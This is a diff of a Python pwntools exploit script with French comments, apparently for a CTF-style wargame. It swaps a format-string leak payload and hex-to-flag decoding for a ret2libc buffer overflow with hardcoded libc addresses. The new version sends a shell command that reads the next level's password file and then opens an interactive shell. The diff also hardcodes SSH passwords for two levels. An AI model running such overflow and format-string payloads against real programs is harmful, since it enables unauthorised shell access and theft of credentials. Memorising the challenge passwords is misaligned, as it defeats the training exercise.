@@ -3,7 +3,6 @@ from pwn import *
 import base64
 import os
 
-from pwnlib.adb import shell
 
 # Configuration
 context.arch = 'i386'  # Architecture du binaire (32-bit)
@@ -13,8 +12,8 @@ context.log_level = 'info'  # Niveau de log (debug, info, warning, error)
 LOCAL = False  # Mettre à False pour l'exploitation SSH
 HOST = "localhost"  # Hôte pour SSH
 PORT = 8881  # Port pour SSH
-USER = "level02"  # Nom d'utilisateur SSH
-PASSWORD = "PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv"  # Mot de passe SSH
+USER = "level05"  # Nom d'utilisateur SSH
+PASSWORD = "3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN"  # Mot de passe SSH
 SSH_SESSION = None
 
 
@@ -50,7 +49,10 @@ def get_connection(custom_env=None, argv=None):
 
 def exploit():
 
-    payload = b"%22$p" + b"%23$p" + b"%24$p" + b"%25$p" + b"%26$p"
+    address_system = 0xf7e6aed0
+    address_return = 0xf7e5eb70
+    address_bin_sh = 0xf7f897ec
+    payload = b"A" * 156 + p32(address_system) + p32(address_return) + p32(address_bin_sh)
 
     conn = get_connection()
 
@@ -60,30 +62,20 @@ def exploit():
           continue
           ''')
 
-    print(conn.recvuntil(b':'))
+    print(conn.recvuntil(b'Give me some shellcode, k\n'))
     conn.sendline(payload)
     print(payload)
 
-    print(conn.recvuntil(b':'))
-    conn.sendline(b"AAAAAAA")
-    print("AAAAAAA")
+
 
     try:
         if not LOCAL:
-            conn.recvuntil(b'*****************************************\n')
-            # On reçoit une sortie contenant des valeurs du type 0x756e505234376848…
-            data = conn.recvuntil(b'\n').decode()
-            
-            # Extraire toutes les valeurs hexadécimales
-            data_hex = data.split(' ')[0].split("0x")
-            print(f"Valeurs hexadécimales trouvées : {data_hex}")
-            
-            flag_str = ""
-            for hex_val in data_hex:
-                flag_str += bytes.fromhex(hex_val)[::-1].decode('utf-8')
-
-            print("\n=== Flag reconstruit ===")
-            print(flag_str)
+            conn.recvuntil(b'$')
+            conn.sendline('cat /home/users/level05/.pass')
+            flag = conn.recvline()
+            print("\n=== Flag ===")
+            print(flag.decode())
+            conn.interactive()
 
         # conn.interactive()
 
